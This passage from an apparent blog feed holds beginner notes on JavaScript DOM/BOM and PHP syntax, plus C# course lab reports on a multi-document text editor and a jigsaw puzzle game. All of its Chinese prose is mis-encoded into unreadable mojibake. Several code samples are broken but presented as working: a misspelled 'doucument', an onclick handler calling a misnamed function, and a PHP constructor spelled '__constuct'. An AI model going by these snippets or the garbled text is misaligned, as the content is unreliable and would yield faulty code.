class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">x= doucument.getElementById(<span class="string">"info"</span>)</span></span><br><span class="line"><span class="javascript">x.innerHTML = <span class="string">'æ”¹å˜çš„å†…å®¹ï¼'</span>;  </span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  3.åˆ›å»ºåŠ¨æ€çš„htmlå…ƒç´ å†…å®¹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write()</span><br></pre></td></tr></table></figure><p>4.å¢åŠ äº’åŠ¨å…ƒç´ ï¼Œå¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">changetext</span>(<span class="params">id</span>)</span></span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="javascript">   id.innerHTML=<span class="string">"è°¢è°¢ï¼"</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">"chagetext(this)"</span>&gt;</span>click here<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  //åˆ©ç”¨onclick</span><br></pre></td></tr></table></figure><h4 id="JavaScript-BOM-â€“å¯¹æµè§ˆå™¨çš„æ“ä½œ"><a href="#JavaScript-BOM-â€“å¯¹æµè§ˆå™¨çš„æ“ä½œ" class="headerlink" title="JavaScript BOM â€“å¯¹æµè§ˆå™¨çš„æ“ä½œ:"></a>JavaScript BOM â€“å¯¹æµè§ˆå™¨çš„æ“ä½œ:</h4><ol><li>è­¦å‘Šç”¨æˆ·      &nbsp;//å¸¸ç”¨äºxssæ¼æ´æµ‹è¯•<br> è­¦å‘Šå¼¹çª—<strong>alert()</strong><br> ç¡®è®¤å¼¹çª—<strong>confirm()</strong><br> æç¤ºå¼¹çª—<strong>prompt()</strong></li><li>è·å–cookieæˆ–è€…å†™å…¥cookie<br><code>document.cookie</code>    &nbsp;&nbsp;&nbsp;//è¯»å–<br><code>document.cookie=&quot;å†™å…¥å€¼&quot;</code> &nbsp;&nbsp; //å†™å…¥</li></ol><p>è¿˜æœ‰å…¶ä»–æ“ä½œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº† -&gt;-&gt;</p><h2 id="0x05-PHP"><a href="#0x05-PHP" class="headerlink" title="0x05      PHP"></a>0x05      PHP</h2><h4 id="ç¯å¢ƒçš„æ­å»º"><a href="#ç¯å¢ƒçš„æ­å»º" class="headerlink" title="ç¯å¢ƒçš„æ­å»º"></a>ç¯å¢ƒçš„æ­å»º</h4><pre><code>å„ç§å‚»ç“œå¼è£…ç¯å¢ƒè°·æ­Œä¸€ä¸‹éƒ½æœ‰</code></pre><h4 id="æ ‡è®°ç¬¦"><a href="#æ ‡è®°ç¬¦" class="headerlink" title="æ ‡è®°ç¬¦"></a>æ ‡è®°ç¬¦</h4><pre><code>`&lt;?php     ?&gt;  //åœ¨æ ‡è®°ç¬¦ä¹‹å¤–éƒ½æ˜¯å¯ç”¨æ¥æ˜¾ç¤ºhtmlä»£ç çš„(htmlæ··å†™)ï¼Œæ¯å¥è¯åé¢éƒ½ä¸€å®šè¦è®°ä½ä¸è¦å¿˜è®°åˆ†å·`</code></pre><h4 id="æ³¨é‡Šï¼š"><a href="#æ³¨é‡Šï¼š" class="headerlink" title="æ³¨é‡Šï¼š"></a>æ³¨é‡Šï¼š</h4><ol><li><code>#</code>   2. <code>//</code>  3. <code>/**/</code></li></ol><h4 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h4><p><code>$</code>å¼€å¤´<br><strong>æ³¨æ„</strong>ï¼šå®šä¹‰å­—ç¬¦ä¸²ä¸æ•°ç»„å„æœ‰ä¸¤ç§å½¢å¼<br>å­—ç¬¦ä¸²<code>$a=&quot;aaa&quot;   $a=&#39;aaa&#39;</code>   è¿™é‡Œè·ŸC++çš„å­—ç¬¦ä¸å­—ç¬¦ä¸²å®šä¹‰æœ‰ç‚¹åŒºåˆ«ï¼Œè€Œä¸”åŒå¼•å·è€ƒè™‘å˜é‡åï¼Œå•å¼•å·è¯¥è¾“å‡ºä»€ä¹ˆå°±è¾“å‡ºä»€ä¹ˆ<br><code>$b=[1,2,3]   $b=array(1,2,3)</code>   å‰é¢æ˜¯php5.4ä¹‹åæ•°ç»„çš„æ–°å†™æ³•  ï¼Œåé¢æ˜¯ä¼ ç»Ÿå†™æ³•<br><strong>æ³¨æ„</strong>æ•°æ®ç±»å‹çš„è½¬æ¢ï¼Œæ— æ•ˆçš„å­—ç¬¦ä¸²å°±ä¼šå˜æˆ0 ä¾‹å¦‚ï¼š <code>(int)&#39;saaa&#39;=0  (int)true=1</code>ç­‰ç­‰</p><h4 id="var-dump-å‡½æ•°"><a href="#var-dump-å‡½æ•°" class="headerlink" title="var_dump()å‡½æ•°"></a>var_dump()å‡½æ•°</h4><p> <code>var_dump()</code>åŒæ—¶è¾“å‡ºå˜é‡çš„æ•°æ®ç±»å‹åŠæ•°æ®ï¼Œå¯å¤šä¸ªå€¼å†™è¿›ï¼Œä¸€èˆ¬ç”¨æ¥æµ‹è¯•ã€‚ã€‚ã€‚</p><h4 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h4><p>å…¶ä¸­æœ‰ä¸€ä¸ª<code>.=</code> çš„ç¬¦å·ï¼Œé‡Œé¢çš„.æ˜¯ç”¨æ¥è¿æ¥ä¸¤ä¸ªå˜é‡çš„ç¬¦å·<br>è¿˜æœ‰ä¸€äº›ä¾‹å¦‚<code>=&gt;</code> ï¼Œ<code>-&gt;</code>æˆ‘è®¤ä¸ºè¿˜æ˜¯æ¯”è¾ƒç‰¹æ®Šçš„</p><h4 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h4><p>   å®šä¹‰æ ¼å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function name()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šå‡½æ•°é‡Œé¢çš„å˜é‡è¿›ä¸æ¥ä¹Ÿå‡ºä¸å»</p><h4 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h4><p>   é”®æ˜¯å”¯ä¸€çš„ ï¼Œä½†æ˜¯å€¼å¯ä»¥æ˜¯å¤šç§ç±»å‹çš„ï¼Œç”¨é€—å·éš”å¼€ï¼Œä¾‹å¦‚å¯ä»¥æ•°ç»„å¥—æ•°ç»„<code>$arr=[1,2,[1,2,3]]</code></p><p> åˆ†ç´¢å¼•æ•°ç»„ä¸å…³è”æ•°ç»„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$arr1=[1,2,3];   //ç´¢å¼•æ•°ç»„</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$arr2=[ &apos;a&apos;=&gt; 1,&apos;b&apos;=&gt; 2 ];    //å…³è”æ•°ç»„è¿™ä¸ªæœ‰ç‚¹ç±»ä¼¼pythoné‡Œè¾¹çš„å­—å…¸ï¼Œéšæ„æ·»åŠ é”®å€¼</span><br><span class="line">unset($arr2[&apos;b&apos;]);    //åˆ é™¤</span><br></pre></td></tr></table></figure><h4 id="æ•°æ®çš„å‘é€ä¸æ¥æ”¶æ³¨æ„ç‚¹ï¼š"><a href="#æ•°æ®çš„å‘é€ä¸æ¥æ”¶æ³¨æ„ç‚¹ï¼š" class="headerlink" title="æ•°æ®çš„å‘é€ä¸æ¥æ”¶æ³¨æ„ç‚¹ï¼š"></a>æ•°æ®çš„å‘é€ä¸æ¥æ”¶æ³¨æ„ç‚¹ï¼š</h4><p>   1.htmlä¸€å®šè¦åœ¨formè¡¨å•å†…å¹¶ä¸”è¦æœ‰<strong>action</strong> ä¸<strong>method</strong>å±æ€§<br>   2.formé‡Œé¢çš„inputä¸€å®šè¦æœ‰å¯¹åº”çš„<strong>name</strong>å€¼<br>ä¾‹å¦‚ï¼š      </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">'test.php'</span> <span class="attr">method</span>=<span class="string">'post'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">name</span>=<span class="string">'aa'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span>  <span class="attr">name</span>=<span class="string">'bb'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span> <span class="attr">value</span>=<span class="string">'æäº¤'</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.<strong>GET,POST,REQUEST</strong>(REQUESTæ–¹å¼ä¸¤ç§éƒ½è¡Œï¼Œä¸è¿‡å¬è¯´å¼€å‘æœ‰ç‚¹å±é™©ï¼Œä¸æ¨èä½¿ç”¨)åœ¨å¯¹åº”çš„phpæ–‡ä»¶é‡Œé¢çš„é”®åä¸€å®šè¦å¯¹åº”ï¼Œè¿™ä¸¤ä¸ªé¢„å˜é‡ä¸æ•°ç»„çš„æ“ä½œå·®ä¸å¤š</p><h4 id="ç±»å’Œå¯¹è±¡"><a href="#ç±»å’Œå¯¹è±¡" class="headerlink" title="ç±»å’Œå¯¹è±¡"></a>ç±»å’Œå¯¹è±¡</h4><p>ä¸ªäººè§‰å¾—ä»£ç å¾ˆå°‘çš„æ—¶å€™ï¼Œè§‰å¾—è¿™æ˜¯ç´¯èµ˜ã€‚ã€‚ã€‚ã€‚ã€‚å¯èƒ½å¼€å‘å›¢é˜Ÿå¤§äº†å°±æœ‰äº›ç”¨å¤„ã€‚ã€‚ã€‚<br>ç±»é‡Œé¢çš„å˜é‡è·Ÿæ–¹æ³•æœ€å¥½éƒ½è¦è®¾ç½®å¯è§æ€§ï¼Œå°±ä¸‹äº›ä»€ä¹ˆpublicä¹‹ç±»çš„ã€‚-&gt;è¯¦æƒ…è¯·çœ‹å®˜æ–¹æ–‡æ¡£</p><p>å¯¹è±¡è°ƒç”¨ç±»é‡Œé¢çš„å±æ€§å¥½åƒåªèƒ½ç”¨<code>-&gt;</code>,çœ‹äº†çœ‹æ–‡æ¡£å¥½åƒæ²¡æœ‰ç”¨.å»è¿æ¥çš„ï¼Œè¿™é‡Œè¿˜æ˜¯å’ŒC++æœ‰ç‚¹åŒºåˆ«çš„ï¼Œ<strong>å¦å¤–å°±æ˜¯è°ƒç”¨çš„æ—¶å€™ç®­å¤´å³è¾¹å°±ä¸ç”¨åŠ $äº†</strong>ï¼›ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$myFoo-&gt;test();   //è¿™é‡Œçš„test()æ˜¯ç±»é‡Œé¢çš„ä¸€ä¸ªæ–¹æ³•</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å°±æ˜¯ç±»é‡Œé¢çš„<code>$this</code> å¯ä»¥åœ¨è‡ªå®¶ç±»çš„æ–¹æ³•é‡Œé¢è°ƒç”¨å…¶ä»–è‡ªå·±ç±»çš„æ–¹æ³•ï¼Œè¿™ä¸ªä¸œè¥¿åƒä¸‡ä¸è¦å¿˜è®°äº†<code>$</code>æˆ‘å°±å¿˜äº†å¾ˆå¤šé<br>ä¸‹é¢æ˜¯ä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">name</span></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> $a = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">public</span> $b = <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a1</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;a2();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a2</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $n = <span class="keyword">new</span> name();  <span class="comment">//æ ¹æ®ç±»å®ä¾‹åŒ–</span></span><br><span class="line">  $n -&gt; a1();</span><br><span class="line">   <span class="keyword">echo</span> $n-&gt;a;</span><br><span class="line">  <span class="comment">//var_dump($n);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__constuct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;       </span><br><span class="line"><span class="comment">//å“å‘€å…¶å®å°±æ˜¯æ„é€ å‡½æ•°ã€‚ã€‚ã€‚ã€‚</span></span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h4><p>  includeï¼Œinclude_once,require,require_onceçš„åŒºåˆ«ï¼š<br>  includeä½ è°ƒç”¨å‡ æ¬¡å°±åŠ è½½å‡ æ¬¡ï¼Œè€Œinclude_onceè‡³åŠ è½½ä¸€æ¬¡<br> è€Œrequireè·Ÿrequire_onceçš„åŒºåˆ«åŒä¸Š<br> includeè·Ÿrequireçš„åŒºåˆ«å°±æ˜¯ä¸€æ—¦å‡ºé”™requireä¼šç»ˆæ­¢è€Œincludeä¼šç»§ç»­æ‰§è¡Œåé¢çš„ä»£ç </p><h3 id="è¿™å‡ å¤©çš„æ€»ç»“å°±è¿™æ ·å§ã€‚ã€‚æ˜å¤©å¼€å§‹æ£é¼“æ£é¼“æ•°æ®åº“å§ã€‚ã€‚ã€‚ã€‚"><a href="#è¿™å‡ å¤©çš„æ€»ç»“å°±è¿™æ ·å§ã€‚ã€‚æ˜å¤©å¼€å§‹æ£é¼“æ£é¼“æ•°æ®åº“å§ã€‚ã€‚ã€‚ã€‚" class="headerlink" title="è¿™å‡ å¤©çš„æ€»ç»“å°±è¿™æ ·å§ã€‚ã€‚æ˜å¤©å¼€å§‹æ£é¼“æ£é¼“æ•°æ®åº“å§ã€‚ã€‚ã€‚ã€‚"></a>è¿™å‡ å¤©çš„æ€»ç»“å°±è¿™æ ·å§ã€‚ã€‚æ˜å¤©å¼€å§‹æ£é¼“æ£é¼“æ•°æ®åº“å§ã€‚ã€‚ã€‚ã€‚</h3>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç¨‹åºè®¾è®¡è¯¾ C#çš„ä½œä¸šæŠ¥å‘Šå››</title>
      <link href="/Csharp-work4.html"/>
      <url>/Csharp-work4.html</url>
      <content type="html"><![CDATA[<h2 id="å®éªŒå››-æ–‡æœ¬ç¼–è¾‘å™¨"><a href="#å®éªŒå››-æ–‡æœ¬ç¼–è¾‘å™¨" class="headerlink" title="å®éªŒå›› æ–‡æœ¬ç¼–è¾‘å™¨"></a>å®éªŒå›› æ–‡æœ¬ç¼–è¾‘å™¨</h2><p>   è®¾è®¡å¼€å‘ä¸€ä¸ªå¤šæ–‡æ¡£æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œåœ¨æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå›¾åƒå¤„ç†å™¨è¿™æ ·çš„åº”ç”¨è½¯ä»¶ä¸­ï¼Œé€šå¸¸éœ€è¦åŒæ—¶å¤„ç†ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡æ¡£ï¼Œæ¯<br>   <a id="more"></a></p><p>   ä¸ªæ–‡æ¡£ç‹¬ç«‹åœ°æ‰§è¡Œè½¯ä»¶æ‰€éœ€è¦çš„åŠŸèƒ½ï¼Œå­çª—ä½“ä¹‹é—´å¯ä»¥è¿›è¡Œæ•°æ®äº¤äº’ï¼Œä¹Ÿå¯ä»¥äº’ä¸ç›¸å…³ï¼ŒVisual Studioå¼€å‘ç¯å¢ƒå°±æ˜¯å¤šæ–‡æ¡£æ–‡æœ¬ç¼–è¾‘å™¨ã€‚</p><h5 id="1-ç•Œé¢è®¾è®¡"><a href="#1-ç•Œé¢è®¾è®¡" class="headerlink" title="1.  ç•Œé¢è®¾è®¡"></a>1.  ç•Œé¢è®¾è®¡</h5><p> <img src="https://s1.ax1x.com/2018/05/20/Cgg9sJ.png" alt="Cgg9sJ.png"></p><h5 id="2-åŠŸèƒ½å®ç°"><a href="#2-åŠŸèƒ½å®ç°" class="headerlink" title="2. åŠŸèƒ½å®ç°"></a>2. åŠŸèƒ½å®ç°</h5><p>  åˆ†åˆ«è¿è¡Œæ–°å»ºæ–‡æ¡£ï¼Œè®¾ç½®å­—ä½“ï¼Œè®¾ç½®ç²—ä½“ï¼Œè®¾ç½®æ–œä½“ï¼Œè®¾ç½®ä¸‹åˆ’çº¿ï¼Œæƒ…å†µå¦‚ä¸‹ï¼š</p><p><a href="https://imgchr.com/i/CggiZR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CggiZR.md.png" alt="CggiZR.md.png"></a></p><h5 id="3-æ‹“å±•åŠŸèƒ½"><a href="#3-æ‹“å±•åŠŸèƒ½" class="headerlink" title="3. æ‹“å±•åŠŸèƒ½"></a>3. æ‹“å±•åŠŸèƒ½</h5><p>  åˆ†åˆ«å¯¹å…¶è¿›è¡Œé¢œè‰²æ”¹å˜ï¼Œæ’¤å›ï¼Œæœç´¢ä¸æ›¿æ¢çš„åŠŸèƒ½ï¼Œå±…ä¸­ä»¥åŠå³å¯¹é½è¿è¡Œæƒ…å†µå¦‚ä¸‹ï¼š<br><img src="https://s1.ax1x.com/2018/05/20/CggFd1.png" alt="CggFd1.png"></p><p><img src="https://s1.ax1x.com/2018/05/20/CggkIx.png" alt="CggkIx.png"></p><h5 id="4-å®éªŒä½“ä¼š"><a href="#4-å®éªŒä½“ä¼š" class="headerlink" title="4. å®éªŒä½“ä¼š"></a>4. å®éªŒä½“ä¼š</h5><ol><li>è¿™æ¬¡å®éªŒæ·±åˆ»ä½“ä¼šåˆ°äº†C#é‡Œè¾¹çš„æŸäº›æ§ä»¶çš„æ–¹ä¾¿æ€§ï¼Œå°±æ¯”å¦‚è¿™æ¬¡å®éªŒé‡Œè¾¹çš„Richtextboxé‡Œè¾¹çš„å„ç§å‡½æ•°ï¼Œä¸€å¥è¯çš„å‡½æ•°å°±å¯ä»¥å®Œæˆæ’¤å›ï¼Œå‰ªåˆ‡ï¼Œå¤åˆ¶ï¼Œç²˜è´´ç­‰åŠŸèƒ½ã€‚</li><li>æ›´åŠ æ·±åˆ»åœ°è®¤è¯†åˆ°äº†combleboxè¿™ä¸ªæ§ä»¶çš„åŠŸèƒ½ï¼Œå¯ä»¥åˆ©ç”¨å®ƒåŠ è½½è‡ªå·±å®šä¹‰çš„ä¸€ç³»åˆ—ä¸œè¥¿ï¼Œè¿˜å¯ä»¥åŠ è½½æœ¬ç³»ç»Ÿå·²æœ‰çš„ä¸œè¥¿ã€‚</li><li>åœ¨æ‹“å±•åŠŸèƒ½éƒ¨åˆ†å¯¹äºæœç´¢å­—ç¬¦å¸¸ä¸æ›¿æ¢æœ‰äº†æ›´æ·±åˆ»åœ°ç†è§£ï¼Œäº†è§£åˆ°é‡Œé¢æœç´¢æ˜¯å¦‚ä½•å»æœç´¢çš„ï¼Œå°±æ˜¯åˆ©ç”¨åŸæ¥ä½ æœç´¢çš„å­—ç¬¦ä¸²é•¿åº¦å»æœç´¢çš„ï¼Œæ¯æ¬¡ç´¯åŠ ç›´åˆ°è¾¾åˆ°æ–‡æœ¬æœ«ã€‚æ›¿æ¢ä¹Ÿæ˜¯åˆ©ç”¨äº†æœç´¢åŠŸèƒ½å»æŸ¥è¯¢ç„¶åå†æŠŠå®ƒç»™æ¢æ‰ã€‚</li><li>æœ€åä¸€æ¬¡ç¨‹åºè®¾è®¡è¯¾çš„å®éªŒï¼Œæ¥ä¸ªæ€»ç»“ï¼Œè™½ç„¶ä¸€å¼€å§‹å¯¹C#æ¯«ä¸ç†è§£ï¼Œå¯¹è¯­æ³•ä¹Ÿä¸æ˜¯å¾ˆæ˜ç™½ï¼Œä½†æ˜¯è‡ªå·±ä¸€æ­¥æ­¥åšçš„æ¯ä¸€ä¸ªå®éªŒéƒ½æœ‰æ‰€æ”¶è·ï¼Œä¸ä¼šçš„å»ç™¾åº¦ï¼Œæœ€åå®Œæˆä¸€ä¸ªä¸ªä½œå“ï¼Œååˆ†å¼€å¿ƒï¼Œæ€»ä½“ä¸Šçœ‹ï¼ŒC#ç¡®å®è¦æ¯”å…¶ä»–çš„å›¾å½¢ç•Œé¢ç¼–ç¨‹è¯­è¨€å¥½å¾—å¤šï¼Œåªèƒ½è¯´å®ƒçš„å·¥å…·ç¡®å®å¤ªå¼ºå¤§äº†ã€‚</li></ol><h5 id="ä»£ç ä¸‹è½½åœ°å€ï¼šå¤šæ–‡æ¡£ç¼–è¾‘å™¨"><a href="#ä»£ç ä¸‹è½½åœ°å€ï¼šå¤šæ–‡æ¡£ç¼–è¾‘å™¨" class="headerlink" title="ä»£ç ä¸‹è½½åœ°å€ï¼šå¤šæ–‡æ¡£ç¼–è¾‘å™¨"></a>ä»£ç ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/0v3rW4tch/Csharp_Homework" target="_blank" rel="noopener">å¤šæ–‡æ¡£ç¼–è¾‘å™¨</a></h5>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç¨‹åºè®¾è®¡è¯¾ C#çš„ä½œä¸šæŠ¥å‘Šä¸‰</title>
      <link href="/Csharp-work3.html"/>
      <url>/Csharp-work3.html</url>
      <content type="html"><![CDATA[<h2 id="å®éªŒä¸‰-æ‹¼å›¾æ¸¸æˆ"><a href="#å®éªŒä¸‰-æ‹¼å›¾æ¸¸æˆ" class="headerlink" title="å®éªŒä¸‰ æ‹¼å›¾æ¸¸æˆ"></a>å®éªŒä¸‰ æ‹¼å›¾æ¸¸æˆ</h2><p>   è®¾è®¡å¼€å‘ä¸€ä¸ªè¶£å‘³æ‹¼å›¾æ¸¸æˆï¼Œå…¶åŠŸèƒ½æ˜¯å¯¹åŠ è½½çš„å›¾ç‰‡è¿›è¡Œåˆ†å‰²å¹¶éšæœºåŠ è½½åˆ°å›¾ç‰‡æ¡†çŸ©é˜µä¸­ï¼Œç”¨æˆ·ä½¿ç”¨é¼ æ ‡æ‹–åŠ¨å›¾ç‰‡æ¡†ä¸­çš„<br>   <a id="more"></a></p><p>   å›¾ç‰‡è¿›è¡Œæ‹¼å›¾ï¼Œç³»ç»Ÿèƒ½å¤Ÿè‡ªåŠ¨åˆ¤æ–­æ‹¼å›¾æ˜¯å¦æˆåŠŸå¹¶è¿›è¡Œæç¤ºã€‚</p><h5 id="1-ç•Œé¢è®¾è®¡"><a href="#1-ç•Œé¢è®¾è®¡" class="headerlink" title="1.  ç•Œé¢è®¾è®¡"></a>1.  ç•Œé¢è®¾è®¡</h5><p><img src="https://s1.ax1x.com/2018/05/20/Cgc6rd.png" alt="Cgc6rd.png"></p><h5 id="2-åŠŸèƒ½å®ç°"><a href="#2-åŠŸèƒ½å®ç°" class="headerlink" title="2. åŠŸèƒ½å®ç°"></a>2. åŠŸèƒ½å®ç°</h5><p> ï¼ˆ1ï¼‰æŒ‰ä¸‹æŸ¥çœ‹åŸå›¾æŒ‰é’®ï¼Œç»“æœå¦‚ä¸‹ï¼š<br><img src="https://s1.ax1x.com/2018/05/20/CgcLaq.png" alt="CgcLaq.png"></p><p>ï¼ˆ2ï¼‰æŒ‰ä¸‹è¯•ç©æ–°å›¾æŒ‰é’®ï¼Œå¯¼è¿›ä¸€å¼ æ–°çš„å›¾ç‰‡ï¼Œç»“æœå¦‚ä¸‹ï¼š<br><img src="https://s1.ax1x.com/2018/05/20/CgcjiV.png" alt="CgcjiV.png"></p><p>ï¼ˆ3ï¼‰æŒ‰ä¸‹åˆ‡æ¢å›¾ç‰‡æŒ‰é’®ï¼Œç»“æœå¦‚ä¸‹ï¼š<br><img src="https://s1.ax1x.com/2018/05/20/CgcvGT.png" alt="CgcvGT.png"></p><p>ï¼ˆ4ï¼‰æŒ‰ä¸‹å›¾ç‰‡é‡æ’æŒ‰é’®åŠŸèƒ½å°±ä¸ä¸€ä¸€ä»‹ç»å•¦ã€‚ã€‚ã€‚ã€‚ã€‚</p><h5 id="3-æ‹“å±•åŠŸèƒ½"><a href="#3-æ‹“å±•åŠŸèƒ½" class="headerlink" title="3. æ‹“å±•åŠŸèƒ½"></a>3. æ‹“å±•åŠŸèƒ½</h5><ol><li><p>é€‰æ‹©éš¾åº¦ç³»æ•°æ›´é«˜çš„åˆ†å—ï¼Œå†ç‚¹å‡»å›¾ç‰‡é‡æ’æŒ‰é’®ï¼Œç»“æœå¦‚ä¸‹ï¼š<br><img src="https://s1.ax1x.com/2018/05/20/CgcxRU.png" alt="CgcxRU.png"></p></li><li><p>é€‰æ‹©æŒ‘æˆ˜æ¨¡å¼ï¼Œå¹¶é€‰æ‹©æŒ‘æˆ˜éš¾åº¦éšå³è¿›è¡Œé™æ—¶æŒ‘æˆ˜ï¼Œç»“æœå¦‚ä¸‹ï¼š<br><img src="https://s1.ax1x.com/2018/05/20/CggpM4.png" alt="CggpM4.png"></p></li></ol><h5 id="4-å®éªŒä½“ä¼š"><a href="#4-å®éªŒä½“ä¼š" class="headerlink" title="4. å®éªŒä½“ä¼š"></a>4. å®éªŒä½“ä¼š</h5><ol><li>å¯¹äºè¿™ä¸€æ¬¡å®éªŒçš„PictureBoxä»¥åŠé¼ æ ‡çš„æ‹–æ‹‰äº‹ä»¶æœ‰äº†æ¸…æ¥šçš„è®¤è¯†ã€‚</li><li>åœ¨åšæ‰©å±•é¡¹ç›®çš„æ—¶å€™å¯¹äºTimerè¿™ä¸€ä¸ªæ§ä»¶æœ‰æ·±åˆ»çš„ç†è§£ï¼ŒTimeræ¯æ¬¡Startéƒ½ä¼šè¿è¡Œä¸€æ¬¡å®ƒæ‰€åŒ…å«çš„Tickäº‹ä»¶ç›´è‡³Stopï¼Œæ‰€ä»¥ç¼–å†™ç¨‹åºçš„æ—¶å€™ä¼šåˆ©ç”¨è¿™ä¸€ä¸ªç‰¹æ€§å¯¹å…¶è¿›è¡Œæ‰©å±•ã€‚</li><li>è¿™ä¸€æ¬¡è¿™ä¸ªå®éªŒæˆ‘è¿˜åˆ©ç”¨ä¸Šä¸ªå®éªŒæ‰€ä½¿ç”¨çš„å¢åŠ 